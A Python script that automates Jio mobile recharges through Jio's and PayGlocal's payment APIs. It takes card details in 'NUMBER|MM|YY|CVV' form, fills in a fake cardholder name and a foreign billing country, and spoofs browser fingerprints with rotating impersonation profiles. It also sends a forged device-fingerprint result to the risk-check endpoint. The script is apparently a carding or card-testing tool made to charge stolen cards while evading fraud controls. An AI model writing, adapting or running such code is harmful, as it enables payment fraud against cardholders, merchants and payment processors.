# Script by @Real_Stocky

from curl_cffi import requests
import re, time, random, sys, json as _json

R="\033[0m"; W="\033[97m"; G="\033[92m"; RD="\033[91m"
Y="\033[93m"; C="\033[96m"; D="\033[90m"; BLD="\033[1m"
WIDTH=55

def line(ch="─"): print(f"{D}  {ch*WIDTH}{R}")
def section(label): print(f"\n{D}  {label}{R}")
def row(label,value,color=W): print(f"  {D}{label:<14}{R}{color}{value}{R}")
def tick(label,elapsed,status="ok"):
    icon=f"{G}✓{R}" if status=="ok" else f"{RD}✗{R}"
    print(f"  {icon}  {W}{label:<38}{D}{elapsed:>5.1f}s{R}")
def spinner(label): print(f"  {Y}◌{R}  {W}{label}{R}",end="\r",flush=True)
def clr(): print(" "*65,end="\r",flush=True)
def ts(): return str(int(time.time()*1000))

PROFILES=[
    {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
    {"imp":"chrome123","ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","ch":'"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"',"plat":'"Linux"',"mob":"?0"},
    {"imp":"edge101","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0","ch":'"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"chrome120","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","ch":'"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"firefox135","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0","ch":'"Firefox";v="135", "Not_A Brand";v="8"',"plat":'"Windows"',"mob":"?0"},
]
SCREENS=[
    {"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30},
    {"h":768,"w":1366,"depth":24},{"h":1200,"w":1920,"depth":24},
    {"h":864,"w":1536,"depth":30},
]
LANGS=["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0.8","en-US,en;q=0.9,hi;q=0.8"]

pf=random.choice(PROFILES); sc=random.choice(SCREENS); lg=random.choice(LANGS)
UA=pf["ua"]; SEC=pf["ch"]; PLAT=pf["plat"]; MOB=pf["mob"]; IMP=pf["imp"]

def jh(ref,ct=None,origin=None,extra=None):
    h={"Accept-Language":lg,"Cache-Control":"no-cache","Connection":"keep-alive","Pragma":"no-cache",
       "Referer":ref,"User-Agent":UA,"sec-ch-ua":SEC,"sec-ch-ua-mobile":MOB,"sec-ch-ua-platform":PLAT}
    if ct: h["Content-Type"]=ct
    if origin: h["Origin"]=origin
    if extra: h.update(extra)
    return h

def ph(ref,ct=None,origin=None,extra=None):
    h={"Accept":"application/json, text/plain, */*","Accept-Language":lg,"Cache-Control":"no-cache",
       "Pragma":"no-cache","Referer":ref,"User-Agent":UA,"sec-ch-ua":SEC,"sec-ch-ua-mobile":MOB,
       "sec-ch-ua-platform":PLAT,"Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors",
       "Sec-Fetch-Site":"same-origin","x-request-time":ts()}
    if ct: h["Content-Type"]=ct
    if origin: h["Origin"]=origin
    if extra: h.update(extra)
    return h

def iter_plans(pj):
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key"):
                    yield {"key":plan["key"],"amount":float(plan.get("amount") or 0),
                           "name":plan.get("name") or plan.get("planName") or "",
                           "category":cat.get("type") or "","validity":plan.get("validity") or ""}

def plan_by_amount(pj,amount):
    for p in iter_plans(pj):
        if p["amount"]==float(amount): return p
    return None

def cheapest_plan(pj):
    plans=list(iter_plans(pj))
    return min(plans,key=lambda p:p["amount"]) if plans else None

def show_plan_menu(pj):
    popular=[11,149,239,349,599,666,719,2999]
    avail={}
    for p in iter_plans(pj):
        amt=int(p["amount"])
        if amt not in avail: avail[amt]=p
    print()
    print(f"  {BLD}{W}SELECT PLAN{R}")
    line()
    options=[]; idx=1
    for amt in popular:
        if amt in avail:
            p=avail[amt]
            name=(p["name"] or p["category"])[:32]
            valid=f"  {D}{p['validity']}{R}" if p["validity"] else ""
            print(f"  {D}[{W}{idx}{D}]{R}  {C}Rs {amt:<6}{R}  {D}{name}{R}{valid}")
            options.append(avail[amt]); idx+=1
    line()
    print(f"  {D}[{W}C{D}]{R}  Custom amount")
    print(f"  {D}[{W}L{D}]{R}  List all plans")
    line()
    while True:
        choice=input(f"\n  {D}>{R} ").strip().upper()
        if choice=="L":
            print()
            all_p=sorted(iter_plans(pj),key=lambda p:p["amount"])
            for i,p in enumerate(all_p,1):
                print(f"  {D}{i:>3}.{R}  {C}Rs {p['amount']:<6.0f}{R}  {D}{(p['name'] or p['category'])[:38]}{R}")
            try:
                n=int(input(f"\n  {D}>{R} ").strip())-1
                return all_p[n]
            except: print(f"  {RD}Invalid{R}")
        elif choice=="C":
            amt=input(f"  {D}Amount:{R} ").strip()
            try:
                p=plan_by_amount(pj,float(amt))
                if p: return p
                print(f"  {RD}No plan for Rs {amt}{R}")
            except: print(f"  {RD}Invalid{R}")
        else:
            try:
                i=int(choice)-1
                if 0<=i<len(options): return options[i]
                print(f"  {RD}Invalid option{R}")
            except: print(f"  {RD}Invalid{R}")

def do_step(label,fn):
    spinner(label)
    t0=time.time()
    try:
        result=fn(); elapsed=time.time()-t0
        clr(); tick(label,elapsed,"ok")
        return result
    except Exception as e:
        elapsed=time.time()-t0
        clr(); tick(label,elapsed,"fail")
        print(f"\n  {RD}Error: {e}{R}\n"); sys.exit(1)

# ═══════════════ MAIN ═══════════════
print()
print(f"{BLD}{W}  {'J I O   R E C H A R G E':^{WIDTH}}{R}")
print(f"  {D}  script by @Real_Stocky{R}")
line("─")

section("MOBILE")
recharge_number=input(f"  {D}>{R} ").strip()

section("CARD   (NUMBER|MM|YY|CVV)")
raw_cc=input(f"  {D}>{R} ").strip()
try:
    CARD_NUM,CARD_MM,CARD_YY,CARD_CVV=raw_cc.split("|")
    if len(CARD_YY)==2: CARD_YY="20"+CARD_YY
except:
    print(f"  {RD}Invalid. Use: 5131...|03|30|086{R}"); sys.exit(1)

CARD_NAME="matt henry"; CARD_PREFIX=CARD_NUM[:6]
masked=f"{CARD_NUM[:4]} {CARD_NUM[4:8]} {CARD_NUM[8:12]} {CARD_NUM[12:]}"

print()
line()
row("MOBILE",  recharge_number,C)
row("CARD",    masked,C)
row("EXPIRY",  f"{CARD_MM} / {CARD_YY[2:]}",C)
row("BROWSER", IMP,D)
line()

session=requests.Session(impersonate=IMP)
flow_start=time.time()

print()
print(f"  {BLD}{W}PROGRESS{R}")
line()

def _s1():
    session.get("https://www.jio.com/",headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":lg,"Upgrade-Insecure-Requests":"1","User-Agent":UA,"sec-ch-ua":SEC,"sec-ch-ua-mobile":MOB,"sec-ch-ua-platform":PLAT},verify=False)
    return True
do_step("Session start",_s1)

def _s2():
    r=session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{recharge_number}",
        headers=jh("https://www.jio.com/",extra={"Accept":"application/json, text/plain, */*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}))
    d=r.json()
    if d.get("errorMessage")=="NOT_SUBSCRIBED_USER": raise Exception("Not a Jio number")
    return d
lookup=do_step("Number lookup",_s2)

primary=lookup.get("primaryService") or {}
billing_type=lookup.get("billingType") or primary.get("billingType") or "PREPAID"
next_value=lookup.get("nextPage") or billing_type
plans_ref=(f"https://www.jio.com/selfcare/recharge/mobility/plans/"
           f"?serviceType=mobility&serviceId={recharge_number}&next={next_value}&billingType={billing_type}&entrysource=Widget")

def _s3():
    return session.get("https://www.jio.com/selfcare/recharge/mobility/plans/",
        params={"serviceType":"mobility","serviceId":recharge_number,"next":next_value,"billingType":billing_type,"entrysource":"Widget"},
        headers=jh("https://www.jio.com/",extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}))
do_step("Load plans",_s3)

r4=session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{recharge_number}",
    headers=jh(plans_ref,extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}))
plans_json=r4.json()

line()
picked=show_plan_menu(plans_json)
plan_key=picked["key"]

print()
print(f"  {BLD}{W}PROCESSING{R}")
line()

def _s5():
    r=session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
        headers=jh(plans_ref,ct="application/json",origin="https://www.jio.com",extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
        json={"planKey":plan_key,"selectedService":recharge_number})
    if r.status_code!=200: raise Exception(f"buy {r.status_code}")
do_step("Checkout",_s5)

def _s6():
    r=session.post("https://www.jio.com/api/jio-recharge-service/recharge/pay",
        headers=jh(plans_ref,ct="application/json",origin="https://www.jio.com",extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
        json={"addonPlanKeys":[],"flexiTopupFlow":False,"servicePlanList":[{"planKey":plan_key,"quantity":1,"serviceId":recharge_number}]})
    return r.json().get("paymentURL","https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")
payment_url=do_step("Payment gateway",_s6)

def _s7():
    r=session.get(payment_url,headers=jh(plans_ref,extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),allow_redirects=True)
    fa=re.search(r"action='([^']+)'",r.text); fi=re.findall(r"name='([^']+)'\s+value='([^']*)'",r.text)
    url=fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
    return url,{k:v for k,v in fi}
pay_form_url,pay_form_data=do_step("Redirect",_s7)

def _s8():
    r=session.post(pay_form_url,
        headers=jh("https://www.jio.com/",ct="application/x-www-form-urlencoded",origin="https://www.jio.com",extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"cross-site","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
        data=pay_form_data,allow_redirects=True)
    return r.url
pay_jio_ref=do_step("Pay portal",_s8)

def _s9():
    r=session.post("https://pay.jio.com/jiopg/v1/authorize-card-operation",
        headers=jh(pay_jio_ref,ct="application/json",origin="https://pay.jio.com",extra={"Accept":"application/json","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
        json={"paymentMode":"CCDC","cardPrefix":CARD_PREFIX,"isEMISelected":False,"viewOffer":False,"skuCode":None,"copco":None,"isStoreCreditSelected":None})
    t=r.json().get("token","")
    if not t: raise Exception("No x-token received")
    return t
x_token=do_step("Authorization",_s9)

def _s10():
    r=session.post("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
        headers=jh(pay_jio_ref,ct="application/json",origin="https://pay.jio.com",extra={"Accept":"application/json","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","x-token":x_token}),
        json={"cvvNumber":CARD_CVV,"cashBackApplied":"N","isTrxnStatusCheckEnable":"N","seqId":"","ccRoutePg":"",
              "customerCardTypeValue":"mastercard","paymentMode":"CCDC","offerAppliedByCust":False,"viewOffer":False,
              "cardType":"ic_mastercard","cardNumber":CARD_NUM,"cardTypeText":"MASTERCARD_CARD",
              "expiryMonth":CARD_MM,"expiryYear":CARD_YY,"cardHolderName":CARD_NAME,"userCardSaveConsent":False,
              "browserDetails":{"browserHeader":"application/json","browserJavaEnabled":False,"browserJavascriptEnabled":True,
                  "browserLanguage":lg.split(",")[0],"browserColorDepth":sc["depth"],
                  "browserScreenHeight":sc["h"],"browserScreenWidth":sc["w"],"browserTz":-330,"browserUserAgent":UA}})
    d=r.json()
    if not d.get("status"): raise Exception(d.get("message","Card confirmation failed"))
    return d.get("htmlForm","")
html_form=do_step("Card confirm",_s10)

def _s11():
    ea=re.search(r"action='([^']+)'",html_form)
    ei=re.findall(r"name='([^']+)'\s+value='([^']*)'",html_form)
    eu=ea.group(1) if ea else ""; ed={k:v for k,v in ei}
    r=session.post(eu,headers=jh(pay_jio_ref,ct="application/x-www-form-urlencoded",origin="https://pay.jio.com",
        extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest":"document",
               "Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"cross-site","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
        data=ed,allow_redirects=True)
    m=re.search(r'x-gl-token=([^&\s"\'\\]+)',r.url+r.text)
    if not m: raise Exception("gl_token not found")
    return m.group(1)
gl_token=do_step("Bank connect",_s11)
gl_ref=f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

def _s12():
    r=session.get("https://api.payglocal.com/gl/v2/payments/redirect/dc",
        params={"x-gl-token":gl_token},
        headers=ph(gl_ref,extra={"x-gl-current-host":"api.payglocal.com","x-gl-gid":"gl_payflow-ui","x-gl-pb-tag-id":"",
            "x-gl-previous-host":"https://pay.easebuzz.in/","x-gl-referrer-mismatch":"false","x-gl-trusted-referrer":"https://pay.easebuzz.in"}))
    if r.status_code!=200: raise Exception(f"PG redirect {r.status_code}")
do_step("PG init",_s12)

def _s13():
    r=session.post("https://api.payglocal.com/gl/v2/payments/pd/paynow",
        params={"x-gl-token":gl_token},
        headers=ph(gl_ref,ct="application/json",origin="https://api.payglocal.com"),
        json={"isEnc":"false","payload":{"customerCurrency":"INR","saveCurrencyPreference":False,
            "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScripEnabled":True,
                "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],"timeZone":-330},
            "billingData":{"addressCountry":"FR"},"shippingData":{},"agreedOnTnCs":True}})
    if r.status_code!=200: raise Exception(f"paynow {r.status_code}")
do_step("Payment init",_s13)

def _s14():
    r=session.post("https://api.payglocal.com/gl/v1/payments/risk/fp",
        params={"x-gl-token":gl_token},
        headers=ph(gl_ref,ct="application/json",origin="https://api.payglocal.com"),
        json={"requestId":f"{ts()}.{random.randint(100000,999999)}","visitorId":"Y8c4sEunqz0opl0b6YAd","visitorFound":True,"confidenceScore":1})
    kid=r.json().get("data",{}).get("kid","")
    if not kid: raise Exception("kid not received")
    return kid
kid=do_step("Risk check",_s14)

def _s15():
    time.sleep(random.uniform(0.5,1.2))
    r=session.post("https://api.payglocal.com/gl/v2/payments/dc/ipay",
        params={"x-gl-token":gl_token},
        headers=ph(gl_ref,ct="application/json",origin="https://api.payglocal.com"),
        json={"isEnc":"false","kid":kid,"payload":{
            "cardNumber":CARD_NUM,"expiryMonth":CARD_MM,"expiryYear":CARD_YY,"cvv":CARD_CVV,
            "cardHolderName":CARD_NAME,"saveCard":False,
            "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScriptEnabled":True,
                "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],
                "timeZone":-330,"userAgent":UA}}})
    return r.json()
result=do_step("Charge",_s15)

total=time.time()-flow_start
status=result.get("status","")
message=result.get("message","")
reason=result.get("reasonCode","")
plan_name=(picked["name"] or picked["category"] or "")[:35]

print()
line("═")
print()
print(f"  {BLD}{W}RESULT{R}")
line()
if status in ("SUCCESS","APPROVED"):
    row("Plan",   plan_name,G)
    row("Amount", f"Rs {picked['amount']:.0f}",G)
    row("Number", recharge_number,G)
    row("Status", "SUCCESS",G)
    line()
    print(f"  {G}{BLD}✓  Recharge Successful{R}   {D}Completed in {total:.1f}s{R}")
else:
    row("Status",  status or "FAILED",RD)
    row("Message", message[:45],RD)
    if reason: row("Reason", reason[:45],D)
    row("Plan",    plan_name,W)
    row("Amount",  f"Rs {picked['amount']:.0f}",W)
    row("Number",  recharge_number,W)
    line()
    if status=="ISSUER_DECLINE":
        print(f"  {RD}{BLD}✗  Card Declined by Issuer{R}   {D}{total:.1f}s{R}")
    else:
        print(f"  {RD}{BLD}✗  Recharge Failed{R}   {D}{total:.1f}s{R}")

line("═")
print()
print(f"  {D}Raw ─────────────────────────────────────────{R}")
_raw=_json.dumps(result,indent=2)
for _l in _raw.splitlines():
    print(f"  {D}{_l}{R}")
print()
print(f"  {D}  script by @Real_Stocky{R}")
print()